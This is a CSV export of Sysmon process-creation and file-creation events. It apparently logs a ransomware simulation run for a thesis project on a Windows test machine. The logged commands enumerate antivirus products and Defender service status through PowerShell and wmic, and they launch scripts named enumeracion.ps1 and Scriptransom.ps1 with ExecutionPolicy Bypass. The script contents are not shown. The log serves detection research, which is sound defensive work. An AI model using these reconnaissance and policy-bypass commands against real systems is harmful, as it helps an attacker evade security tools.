_ts,ID,Timestamp,EventData,ClientId
1783860510744,1,2026-07-12T12:48:35.0740266Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:27.862"",
 ""ProcessGuid"": ""{6bc49a7d-8d1b-6a53-9605-000000009a01}"",
 ""ProcessId"": 2892,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,1,2026-07-12T12:48:35.1056172Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:27.898"",
 ""ProcessGuid"": ""{6bc49a7d-8d1b-6a53-9705-000000009a01}"",
 ""ProcessId"": 8204,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -Command \""Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d1b-6a53-9605-000000009a01}"",
 ""ParentProcessId"": ""2892"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \""Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Select-Object displayName,productState; Get-Service WinDefend,SecurityHealthService -ErrorAction SilentlyContinue | Select-Object Name,Status\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860510744,11,2026-07-12T12:48:35.2743402Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:28.166"",
 ""ProcessGuid"": ""{6bc49a7d-8d1b-6a53-9705-000000009a01}"",
 ""ProcessId"": 8204,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_nx5fvnqk.qsq.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:48:28.166"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:37.8680689Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:32.055"",
 ""ProcessGuid"": ""{6bc49a7d-8d20-6a53-9805-000000009a01}"",
 ""ProcessId"": 9536,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:37.9026127Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:32.091"",
 ""ProcessGuid"": ""{6bc49a7d-8d20-6a53-9905-000000009a01}"",
 ""ProcessId"": 6384,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""cmd.exe  /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d20-6a53-9805-000000009a01}"",
 ""ParentProcessId"": ""9536"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c cmd.exe /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:37.9209154Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:32.129"",
 ""ProcessGuid"": ""{6bc49a7d-8d20-6a53-9a05-000000009a01}"",
 ""ProcessId"": 8716,
 ""Image"": ""C:\\Windows\\System32\\wbem\\WMIC.exe"",
 ""FileVersion"": ""10.0.19041.1741 (WinBuild.160101.0800)"",
 ""Description"": ""WMI Commandline Utility"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""wmic.exe"",
 ""CommandLine"": ""wmic  /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=C37F2F4F4B3CD128BDABCAEB2266A785,SHA256=12ABB45620A7A1FFD8BB953DEBA3FCC30B8BA14B2FF523F1F519BF2BF6BA7D4C,IMPHASH=527C7C66CDD13D72D793BCA3A417BCBE"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d20-6a53-9905-000000009a01}"",
 ""ParentProcessId"": ""6384"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""cmd.exe  /c \""wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState\"""",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:48.608903Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:48.161"",
 ""ProcessGuid"": ""{6bc49a7d-8d30-6a53-9b05-000000009a01}"",
 ""ProcessId"": 9684,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:48:48.6455997Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:48.202"",
 ""ProcessGuid"": ""{6bc49a7d-8d30-6a53-9c05-000000009a01}"",
 ""ProcessId"": 11304,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d30-6a53-9b05-000000009a01}"",
 ""ParentProcessId"": ""9684"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:48:48.8056977Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:48:48.457"",
 ""ProcessGuid"": ""{6bc49a7d-8d30-6a53-9c05-000000009a01}"",
 ""ProcessId"": 11304,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mzwkgnmi.bfs.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:48:48.457"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:04.3291585Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:10.274"",
 ""ProcessGuid"": ""{6bc49a7d-8d46-6a53-9e05-000000009a01}"",
 ""ProcessId"": 8424,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:04.4063546Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:10.342"",
 ""ProcessGuid"": ""{6bc49a7d-8d46-6a53-9f05-000000009a01}"",
 ""ProcessId"": 8752,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d46-6a53-9e05-000000009a01}"",
 ""ParentProcessId"": ""8424"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\enumeracion.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:04.7173543Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:10.791"",
 ""ProcessGuid"": ""{6bc49a7d-8d46-6a53-9f05-000000009a01}"",
 ""ProcessId"": 8752,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_3biswfa2.cbt.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:10.791"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:06.0431422Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:12.402"",
 ""ProcessGuid"": ""{6bc49a7d-8d48-6a53-a005-000000009a01}"",
 ""ProcessId"": 2116,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:06.0836438Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:12.442"",
 ""ProcessGuid"": ""{6bc49a7d-8d48-6a53-a105-000000009a01}"",
 ""ProcessId"": 11092,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d48-6a53-a005-000000009a01}"",
 ""ParentProcessId"": ""2116"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\Scriptransom.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:06.2288744Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:12.628"",
 ""ProcessGuid"": ""{6bc49a7d-8d48-6a53-a105-000000009a01}"",
 ""ProcessId"": 11092,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_pl2ld1rb.fpl.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:12.628"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:09.8626523Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:17.043"",
 ""ProcessGuid"": ""{6bc49a7d-8d4d-6a53-a205-000000009a01}"",
 ""ProcessId"": 1716,
 ""Image"": ""C:\\Windows\\System32\\cmd.exe"",
 ""FileVersion"": ""10.0.19041.746 (WinBuild.160101.0800)"",
 ""Description"": ""Windows Command Processor"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""Cmd.Exe"",
 ""CommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=8A2122E8162DBEF04694B9C3E0B6CDEE,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18"",
 ""ParentProcessGuid"": ""{6bc49a7d-7f1e-6a53-1c04-000000009a01}"",
 ""ParentProcessId"": ""12104"",
 ""ParentImage"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""ParentCommandLine"": ""\""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,1,2026-07-12T12:49:09.8936704Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:17.071"",
 ""ProcessGuid"": ""{6bc49a7d-8d4d-6a53-a305-000000009a01}"",
 ""ProcessId"": 1384,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""FileVersion"": ""10.0.19041.3393 (WinBuild.160101.0800)"",
 ""Description"": ""Windows PowerShell"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""PowerShell.EXE"",
 ""CommandLine"": ""powershell.exe  -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-01ca-280000000000}"",
 ""LogonId"": ""0x28CA01"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""High"",
 ""Hashes"": ""MD5=DFD66604CA0898E8E26DF7B1635B6326,SHA256=D23B67799A0DA0143E395BA5DB906A22AB08FAC4BD5581E275B1E0F1B3FAC55C,IMPHASH=88CB9A420410BDA787E305B65518A934"",
 ""ParentProcessGuid"": ""{6bc49a7d-8d4d-6a53-a205-000000009a01}"",
 ""ParentProcessId"": ""1716"",
 ""ParentImage"": ""C:\\Windows\\System32\\cmd.exe"",
 ""ParentCommandLine"": ""\""cmd.exe\"" /d /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File \""C:\\Users\\seguridad\\Desktop\\TFM\\01_ACTIVE_TESTS\\Pruebas\\TEC-007_Ransomware\\crear_directorio_dummy.ps1\"" "",
 ""ParentUser"": ""LT29\\seguridad""
}",C.364907172793f8c7
1783860655303,11,2026-07-12T12:49:10.0852453Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:49:17.307"",
 ""ProcessGuid"": ""{6bc49a7d-8d4d-6a53-a305-000000009a01}"",
 ""ProcessId"": 1384,
 ""Image"": ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"",
 ""TargetFilename"": ""C:\\Users\\seguridad\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ctnyzhy2.oc2.ps1"",
 ""CreationUtcTime"": ""2026-07-12 12:49:17.307"",
 ""User"": ""LT29\\seguridad""
}",C.364907172793f8c7
